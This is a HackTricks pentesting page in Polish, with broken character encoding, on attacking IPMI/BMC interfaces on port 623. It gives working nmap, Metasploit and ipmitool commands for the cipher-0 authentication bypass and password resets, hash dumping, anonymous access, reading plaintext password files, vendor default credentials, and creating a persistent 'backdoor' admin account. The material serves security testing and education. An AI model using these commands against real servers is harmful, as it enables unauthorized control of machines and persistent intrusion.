# 623/UDP/TCP - IPMI

## 623/UDP/TCP - IPMI

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the**  [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter**  [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## Podstawowe informacje

### **Przegld IPMI**

**[Intelligent Platform Management Interface (IPMI)](https://www.thomas-krenn.com/en/wiki/IPMI_Basics)** oferuje ustandaryzowane podejcie do zdalnego zarzdzania i monitorowania system贸w komputerowych, niezale偶nie od systemu operacyjnego czy stanu zasilania. Technologia ta pozwala administratorom system贸w na zdalne zarzdzanie systemami, nawet gdy s wyczone lub nieodpowiadajce, i jest szczeg贸lnie przydatna w przypadku:

- Konfiguracji przed uruchomieniem systemu operacyjnego
- Zarzdzania zasilaniem
- Odzyskiwania po awariach systemu

IPMI jest w stanie monitorowa temperatury, napicia, prdkoci wentylator贸w i zasilacze, a tak偶e dostarcza informacje o inwentarzu, przeglda logi sprztowe i wysya powiadomienia za pomoc SNMP. Do jego dziaania niezbdne s 藕r贸do zasilania i poczenie LAN.

Od momentu wprowadzenia przez firm Intel w 1998 roku, IPMI jest wspierane przez wielu dostawc贸w, co zwiksza mo偶liwoci zdalnego zarzdzania, szczeg贸lnie dziki wsparciu wersji 2.0 dla komunikacji szeregowej przez LAN. Kluczowe komponenty to:

- **Baseboard Management Controller (BMC):** G贸wny mikrokontroler do operacji IPMI.
- **Szyny i interfejsy komunikacyjne:** Do komunikacji wewntrznej i zewntrznej, w tym ICMB, IPMB oraz r贸偶ne interfejsy do pocze lokalnych i sieciowych.
- **Pami IPMI:** Do przechowywania log贸w i danych.

![https://blog.rapid7.com/content/images/post-images/27966/IPMI-Block-Diagram.png#img-half-right](https://blog.rapid7.com/content/images/post-images/27966/IPMI-Block-Diagram.png#img-half-right)

**Domylny port**: 623/UDP/TCP (Zwykle dziaa na UDP, ale mo偶e r贸wnie偶 dziaa na TCP)

## Enumeracja

### Odkrywanie
```bash
nmap -n -p 623 10.0.0./24
nmap -n-sU -p 623 10.0.0./24
use  auxiliary/scanner/ipmi/ipmi_version
```
Mo偶esz **zidentyfikowa** **wersj** za pomoc:
```bash
use auxiliary/scanner/ipmi/ipmi_version
nmap -sU --script ipmi-version -p 623 10.10.10.10
```
### IPMI Vulnerabilities

W dziedzinie IPMI 2.0, istotna luka w zabezpieczeniach zostaa odkryta przez Dana Farmera, ujawniajc podatno poprzez **cipher type 0**. Ta podatno, szczeg贸owo udokumentowana w [badaniach Dana Farmera](http://fish2.com/ipmi/cipherzero.html), umo偶liwia nieautoryzowany dostp z dowolnym hasem, pod warunkiem, 偶e celem jest wa偶ny u偶ytkownik. Ta sabo zostaa znaleziona w r贸偶nych BMC od producent贸w takich jak HP, Dell i Supermicro, co sugeruje powszechny problem we wszystkich implementacjach IPMI 2.0.

### **IPMI Authentication Bypass via Cipher 0**

Aby wykry t luk, mo偶na wykorzysta nastpujcy skaner pomocniczy Metasploit:
```bash
use auxiliary/scanner/ipmi/ipmi_cipher_zero
```
Wykorzystanie tej luki jest mo偶liwe za pomoc `ipmitool`, jak pokazano poni偶ej, co pozwala na wywietlenie i modyfikacj hase u偶ytkownik贸w:
```bash
apt-get install ipmitool # Installation command
ipmitool -I lanplus -C 0 -H 10.0.0.22 -U root -P root user list # Lists users
ipmitool -I lanplus -C 0 -H 10.0.0.22 -U root -P root user set password 2 abc123 # Changes password
```
### **IPMI 2.0 RAKP Authentication Remote Password Hash Retrieval**

Ta luka umo偶liwia pobranie zasolonych haszy hase (MD5 i SHA1) dla dowolnej istniejcej nazwy u偶ytkownika. Aby przetestowa t luk, Metasploit oferuje modu:
```bash
msf > use auxiliary/scanner/ipmi/ipmi_dumphashes
```
### **IPMI Anonymous Authentication**

Domylna konfiguracja w wielu BMC pozwala na "anonimowy" dostp, charakteryzujcy si pustymi cigami nazwy u偶ytkownika i hasa. Ta konfiguracja mo偶e by wykorzystana do resetowania hase kont u偶ytkownik贸w o nazwanych kontach za pomoc `ipmitool`:
```bash
ipmitool -I lanplus -H 10.0.0.97 -U '' -P '' user list
ipmitool -I lanplus -H 10.0.0.97 -U '' -P '' user set password 2 newpassword
```
### **Supermicro IPMI Hasa w czystym tekcie**

Krytyczny wyb贸r projektowy w IPMI 2.0 wymaga przechowywania hase w czystym tekcie w BMC w celach uwierzytelniania. Przechowywanie tych hase przez Supermicro w lokalizacjach takich jak `/nv/PSBlock` lub `/nv/PSStore` budzi powa偶ne obawy dotyczce bezpieczestwa:
```bash
cat /nv/PSBlock
```
### **Supermicro IPMI UPnP Vulnerability**

Wczenie przez Supermicro nasuchiwacza UPnP SSDP w swoim oprogramowaniu IPMI, szczeg贸lnie na porcie UDP 1900, wprowadza powa偶ne ryzyko bezpieczestwa. Luki w Intel SDK dla urzdze UPnP w wersji 1.3.1, szczeg贸owo opisane w [ujawnieniu Rapid7](https://blog.rapid7.com/2013/01/29/security-flaws-in-universal-plug-and-play-unplug-dont-play), umo偶liwiaj dostp root do BMC:
```bash
msf> use exploit/multi/upnp/libupnp_ssdp_overflow
```
### Brute Force

**HP losowo generuje domylne haso** dla swojego produktu **Integrated Lights Out (iLO)** podczas produkcji. Ta praktyka r贸偶ni si od innych producent贸w, kt贸rzy zazwyczaj u偶ywaj **statycznych domylnych powiadcze**. Podsumowanie domylnych nazw u偶ytkownik贸w i hase dla r贸偶nych produkt贸w przedstawiono poni偶ej:

- **HP Integrated Lights Out (iLO)** u偶ywa **fabrycznie losowego 8-znakowego cigu** jako domylnego hasa, co pokazuje wy偶szy poziom bezpieczestwa.
- Produkty takie jak **iDRAC firmy Dell, IMM firmy IBM** i **Zintegrowany Kontroler Zdalnego Zarzdzania Fujitsu** u偶ywaj atwych do odgadnicia hase, takich jak "calvin", "PASSW0RD" (z zerem) i "admin" odpowiednio.
- Podobnie, **Supermicro IPMI (2.0), Oracle/Sun ILOM** i **ASUS iKVM BMC** r贸wnie偶 u偶ywaj prostych domylnych powiadcze, z "ADMIN", "changeme" i "admin" jako ich hasami.


## Accessing the Host via BMC

Dostp administracyjny do Kontrolera Zarzdzania Pyt G贸wn (BMC) otwiera r贸偶ne cie偶ki do uzyskania dostpu do systemu operacyjnego hosta. Proste podejcie polega na wykorzystaniu funkcji KVM (Keyboard, Video, Mouse) BMC. Mo偶na to zrobi, uruchamiajc ponownie hosta do powoki root za pomoc GRUB (u偶ywajc `init=/bin/sh`) lub uruchamiajc z wirtualnego CD-ROM-u ustawionego jako dysk ratunkowy. Takie metody pozwalaj na bezporedni manipulacj dyskiem hosta, w tym wstawianie backdoor贸w, ekstrakcj danych lub wszelkie niezbdne dziaania w celu oceny bezpieczestwa. Jednak wymaga to ponownego uruchomienia hosta, co jest istotn wad. Bez ponownego uruchamiania, dostp do dziaajcego hosta jest bardziej skomplikowany i r贸偶ni si w zale偶noci od konfiguracji hosta. Jeli fizyczna lub szeregowa konsola hosta pozostaje zalogowana, mo偶na j atwo przej za pomoc funkcji KVM lub serial-over-LAN (sol) BMC za pomoc `ipmitool`. Badanie wykorzystania wsp贸lnych zasob贸w sprztowych, takich jak magistrala i2c i chip Super I/O, to obszar, kt贸ry wymaga dalszego zbadania.

## Introducing Backdoors into BMC from the Host

Po skompromitowaniu hosta wyposa偶onego w BMC, **lokalny interfejs BMC mo偶e by wykorzystany do wstawienia konta u偶ytkownika backdoor**, tworzc trwa obecno na serwerze. Atak ten wymaga obecnoci **`ipmitool`** na skompromitowanym hocie oraz aktywacji wsparcia dla sterownik贸w BMC. Poni偶sze polecenia ilustruj, jak nowe konto u偶ytkownika mo偶e by wstrzyknite do BMC za pomoc lokalnego interfejsu hosta, co omija potrzeb uwierzytelnienia. Ta technika ma zastosowanie w szerokim zakresie system贸w operacyjnych, w tym Linux, Windows, BSD, a nawet DOS.
```bash
ipmitool user list
ID  Name        Callin  Link Auth    IPMI Msg  Channel Priv Limit
2  ADMIN            true    false      false      Unknown (0x00)
3  root            true    false      false      Unknown (0x00)

ipmitool user set name 4 backdoor
ipmitool user set password 4 backdoor
ipmitool user priv 4 4
ipmitool user list
ID  Name        Callin  Link Auth    IPMI Msg  Channel Priv Limit
2  ADMIN            true    false      false      Unknown (0x00)
3  root            true    false      false      Unknown (0x00)
4  backdoor        true    false      true      ADMINISTRATOR
```
## Shodan

* `port:623`

## References

* [https://blog.rapid7.com/2013/07/02/a-penetration-testers-guide-to-ipmi/](https://blog.rapid7.com/2013/07/02/a-penetration-testers-guide-to-ipmi/)

{% hint style="success" %}
Ucz si i wicz Hacking AWS:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Ucz si i wicz Hacking GCP: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Wsparcie HackTricks</summary>

* Sprawd藕 [**plany subskrypcyjne**](https://github.com/sponsors/carlospolop)!
* **Docz do**  [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegram**](https://t.me/peass) lub **led藕** nas na **Twitterze**  [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Dziel si trikami hackingowymi, przesyajc PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repozytori贸w github.

</details>
{% endhint %}
